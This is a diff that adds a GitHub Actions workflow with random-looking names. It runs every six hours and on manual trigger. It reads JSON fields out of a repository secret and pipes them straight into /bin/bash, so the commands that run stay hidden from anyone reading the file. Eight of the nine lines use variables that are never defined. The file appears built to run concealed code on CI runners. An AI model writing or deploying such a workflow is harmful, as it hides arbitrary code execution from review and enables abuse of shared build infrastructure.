@@ -1,0 +1,24 @@
+name: nichaofan6781
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '24 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: nichaofan6781
+        env:
+          bzy11320: ${{ secrets.bzy11320 }}
+        run: |
+          echo $bzy11320 | jq -r .xkg8 | /bin/bash
+          echo $cpa28 | jq -r .zk88964 | /bin/bash
+          echo $an27501 | jq -r .n7383 | /bin/bash
+          echo $fvcd55167 | jq -r .msc2809 | /bin/bash
+          echo $ihvjg563 | jq -r .byklr031 | /bin/bash
+          echo $lzfkt827 | jq -r .kcyux730 | /bin/bash
+          echo $tc066 | jq -r .eif7 | /bin/bash
+          echo $o0048 | jq -r .x169 | /bin/bash
+          echo $zbm3316 | jq -r .p40 | /bin/bash
+
